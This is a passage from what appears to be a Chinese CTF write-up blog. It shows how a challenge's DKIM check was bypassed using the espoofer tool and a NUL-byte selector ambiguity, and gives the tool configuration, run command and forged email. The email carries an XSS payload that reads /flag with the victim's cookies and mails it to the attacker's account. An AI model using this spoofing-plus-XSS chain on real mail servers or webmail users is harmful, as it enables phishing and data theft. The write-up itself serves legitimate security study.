+</span></span><span style="display:flex;"><span>6Jm954S25bmz5Y<span style="color:#ff6ac1">+</span>w5by65Yi25oiRMjTlsI<span style="color:#ff6ac1">/</span>ml7blnKjnur8sIOS9huaYr<span style="color:#ff6ac1">+</span>aIkeW3sue7j<span style="color:#ff6ac1">+</span>aLiem7
+</span></span><span style="display:flex;"><span>keS6huaJgOacieeahOadpeS<span style="color:#ff6ac1">/</span>oSwg6Zmk5LqG5oiR55qE56eB5Lq66YKu566xIE9CeDdWSDdKVEs0
+</span></span><span style="display:flex;"><span>dnpSYkBvdXRsb29rLmNvbSwg5L2g5Lus54Om5LiN5LqG5oiRLCDlmI7lmI4h
+</span></span></code></pre></div><p>可以发现添加了DKIM验证头Teapot-Authentication-Result，也就是说如果想要伪造邮件，我们需要绕过DKIM验证。</p>
+<p>DKIM全名<strong>DomainKeys Identified Mail</strong>,邮件发送方发送邮件时，利用本域私钥加密邮件生成DKIM-Signature，将DKIM-Signature及其相关信息插入邮件头。邮件接收方接收邮件时，通过DNS查询获得公钥，验证邮件DKIM签名的有效性。从而确认在邮件发送的过程中，防止邮件被恶意篡改，保证邮件内容的完整性。
+一个DKIM验证流程如下</p>
+<p><img alt="截屏2023-04-30 13.15.17.png" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/1682831723795-e30bc4fc-eca9-4fff-9df7-ca87f50f51d9.png"></p>
+<p>其中最关键的部分为查询对应域名TXT记录中的公钥来验证签名</p>
+<p>那么我们该如何进行伪造呢?这篇文章给了我们答案:
+<a href="https://www.usenix.org/system/files/sec20fall_chen-jianjun_prepub_0.pdf">https://www.usenix.org/system/files/sec20fall_chen-jianjun_prepub_0.pdf</a></p>
+<p>我们可以通过在DKIM签名中的s字段插入特殊字符，从而导致查询 DNS 记录时查询域名出现歧义，将验证的域名导向任意域名而不触发域名对齐验证的失败。</p>
+<p><strong>于是乎整个攻击流程：</strong></p>
+<p>工具：<a href="https://github.com/chenjj/espoofer">https://github.com/chenjj/espoofer</a></p>
+<ul>
+<li>为域名配置DKIM公钥记录</li>
+<li>修改工具配置文件以对题目环境进行攻击：</li>
+</ul>
+<p><code>common.py</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">generate_dkim_header</span>(dkim_msg, dkim_para):
+</span></span><span style="display:flex;"><span>    d <span style="color:#ff6ac1">=</span> dkim<span style="color:#ff6ac1">.</span>DKIM(dkim_msg)
+</span></span><span style="display:flex;"><span>    dkim_header <span style="color:#ff6ac1">=</span> d<span style="color:#ff6ac1">.</span>sign(dkim_para[<span style="color:#5af78e">&#34;s&#34;</span>], dkim_para[<span style="color:#5af78e">&#34;d&#34;</span>], <span style="color:#ff5c57">open</span>(<span style="color:#5af78e">&#34;dkimkey&#34;</span>,<span style="color:#5af78e">&#34;rb&#34;</span>)<span style="color:#ff6ac1">.</span>read(), canonicalize<span style="color:#ff6ac1">=</span>(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;relaxed&#39;</span>,<span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;relaxed&#39;</span>), include_headers<span style="color:#ff6ac1">=</span>[<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;from&#34;</span>])<span style="color:#ff6ac1">.</span>strip()<span style="color:#ff6ac1">+</span><span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\r\n</span><span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> dkim_header
+</span></span></code></pre></div><p><code>config.py</code></p>
+<p><img alt="截屏2023-04-30 23.21.09.png" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/1682868078652-6cc89b58-d293-4182-8fb1-2dcb3db4060e.png"></p>
+<p><code>testcases.py</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#5af78e">&#34;server_a3&#34;</span><span style="color:#ff5c57">:</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">&#34;helo&#34;</span>: <span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;33.attack.com&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">&#34;mailfrom&#34;</span>: <span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;&lt;OBx7VH7JTK4vzRb@outlook.com&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">&#34;rcptto&#34;</span>: <span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;&lt;victim@victim.com&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">&#34;dkim_para&#34;</span>: {<span style="color:#ff6ac1">&#34;d&#34;</span>:<span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;legitimate.com&#34;</span>, <span style="color:#ff6ac1">&#34;s&#34;</span>:<span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;dkim._domainkey.attack.com.\x00.outlook.com&#34;</span>, <span style="color:#ff6ac1">&#34;sign_header&#34;</span>: <span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;From: &lt;admin@legitimate.com&gt;&#34;</span>},
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&#34;from_header&#34;</span>: <span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;From: &lt;admin@legitimate.com&gt;\r\n&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&#34;to_header&#34;</span>: <span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;To: &lt;victim@victim.com&gt;\r\n&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&#34;subject_header&#34;</span>: <span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;Subject: A3: NUL ambiguity\r\n&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&#34;body&#34;</span>: <span style="color:#ff5c57">b&#39;Hi</span>, <span style="color:#ff5c57">this</span> <span style="color:#ff5c57">is</span> <span style="color:#ff5c57">a</span> <span style="color:#ff5c57">test</span> <span style="color:#ff5c57">message!</span> <span style="color:#ff5c57">Best</span> <span style="color:#ff5c57">wishes.\r\n&#39;,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&#34;other_headers&#34;</span>: <span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;Date: &#34;</span> <span style="color:#ff5c57">+</span> <span style="color:#ff5c57">get_date()</span> <span style="color:#ff5c57">+</span> <span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;\r\n&#34;</span> <span style="color:#ff5c57">+</span> <span style="color:#ff5c57">b&#39;Content-Type</span>: <span style="color:#ff5c57">multipart/alternative;</span> <span style="color:#ff5c57">boundary=</span><span style="color:#5af78e">&#34;001a113db9c28077e7054ee99e9c&#34;</span><span style="color:#ff5c57">\r\nMIME-Version</span>: <span style="color:#ff9f43">1.0</span><span style="color:#ff5c57">\r\nMessage-ID</span>: <span style="color:#ff5c57">&lt;</span><span style="color:#ff9f43">1538085644648.096e3</span><span style="color:#ff5c57">d</span><span style="color:#ff9f43">4</span><span style="color:#ff5c57">e-bc</span><span style="color:#ff9f43">38-4027</span><span style="color:#ff5c57">-b</span><span style="color:#ff9f43">57</span><span style="color:#ff5c57">e-&#39;</span> <span style="color:#ff5c57">+</span> <span style="color:#ff5c57">id_generator()</span> <span style="color:#ff5c57">+</span> <span style="color:#ff5c57">b&#39;@message-ids.attack.com&gt;\r\nX-Email-Client</span>: <span style="color:#ff5c57">https</span>:<span style="color:#78787e">//github.com/chenjj/espoofer\r\n\r\n&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">&#34;description&#34;</span>: <span style="color:#ff5c57">b</span><span style="color:#5af78e">&#34;NUL ambiguity, refer to A3 attack in the paper.&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>最终伪造的邮件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff5c57">From</span>: <span style="color:#ff6ac1">&lt;</span>OBx7VH7JTK4vzRb<span style="color:#ff9f43">@outlook.com</span><span style="color:#ff6ac1">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">To</span>: <span style="color:#ff6ac1">&lt;</span>admin<span style="color:#ff9f43">@localhost</span><span style="color:#ff6ac1">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">Subject</span>: SU<span style="color:#ff6ac1">-</span>Team
+</span></span><span style="display:flex;"><span>Content<span style="color:#ff6ac1">-</span>Type: text<span style="color:#ff6ac1">/</span>html;
+</span></span><span style="display:flex;"><span>MIME<span style="color:#ff6ac1">-</span>Version: 1.<span style="color:#57c7ff">0</span>
+</span></span><span style="display:flex;"><span>X<span style="color:#ff6ac1">-</span>Email<span style="color:#ff6ac1">-</span>Client: https:<span style="color:#78787e">//github.com/chenjj/espoofer</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;</span>img src<span style="color:#ff6ac1">=</span>x onerror<span style="color:#ff6ac1">=</span><span style="color:#ff5c57">&#39;</span>fetch(<span style="color:#5af78e">&#34;/flag&#34;</span>, {
+</span></span><span style="display:flex;"><span>    method: <span style="color:#5af78e">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>    headers: {
+</span></span><span style="display:flex;"><span>        <span style="color:#5af78e">&#34;Content-Type&#34;</span>: <span style="color:#5af78e">&#34;application/json&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    credentials: <span style="color:#5af78e">&#34;include&#34;</span>,
+</span></span><span style="display:flex;"><span>}).<span style="color:#57c7ff">then</span>(response <span style="color:#ff6ac1">=&gt;</span> response.<span style="color:#57c7ff">json</span>())
+</span></span><span style="display:flex;"><span>.<span style="color:#57c7ff">then</span>(function(data){
+</span></span><span style="display:flex;"><span>    flag <span style="color:#ff6ac1">=</span> JSON.<span style="color:#57c7ff">stringify</span>(data)
+</span></span><span style="display:flex;"><span>    fetch(<span style="color:#5af78e">&#34;/mail&#34;</span>, {
+</span></span><span style="display:flex;"><span>        method: <span style="color:#5af78e">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        headers: {
+</span></span><span style="display:flex;"><span>            <span style="color:#5af78e">&#34;Content-Type&#34;</span>: <span style="color:#5af78e">&#34;application/json&#34;</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        body: JSON.<span style="color:#57c7ff">stringify</span>({
+</span></span><span style="display:flex;"><span>            toUserName: <span style="color:#5af78e">&#34;068e732ed09929fc&#34;</span>,
+</span></span><span style="display:flex;"><span>            subject: <span style="color:#5af78e">&#34;flag&#34;</span>,
+</span></span><span style="display:flex;"><span>            content: flag
+</span></span><span style="display:flex;"><span>        }),
+</span></span><span style="display:flex;"><span>        credentials: <span style="color:#5af78e">&#34;include&#34;</span>
+</span></span><span style="display:flex;"><span>    });})<span style="color:#ff5c57">&#39;</span><span style="color:#ff6ac1">&gt;</span>
+</span></span></code></pre></div><p>之后我们运行工具即可进行攻击：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#ff5c57">python</span><span style="color:#ff9f43">3</span> <span style="color:#ff5c57">espoofer.py</span> <span style="color:#ff5c57">-id</span> <span style="color:#ff5c57">server_a</span><span style="color:#ff9f43">3</span>
+</span></span></code></pre></div><p><img alt="截屏2023-04-30 04.02.38.png" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/1682798578673-f11ebea0-5ca1-4244-8199-146cb0ea256c.png"></p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+        <div class="site-footer">
+  
+  
+
+  
+    <script src="/js/clipboard.js"></script>
+  
+
+  
+  
+
+    
+      
+      
+      <div class="site-footer">
+        <div class="busuanzi-footer">
+          <span id="busuanzi_container_site_pv">
+            本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+          </span>
+          <span class="separator">|</span> 
+          <span id="busuanzi_container_site_uv">
+            本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
+          </span>
+        </div>
+        <p class="footer-beian"> 
+          <a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener noreferrer">
+            蜀ICP备2021024344号-1
+          </a>
+        </p>
+      </div>
+
+      
+    </div>
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
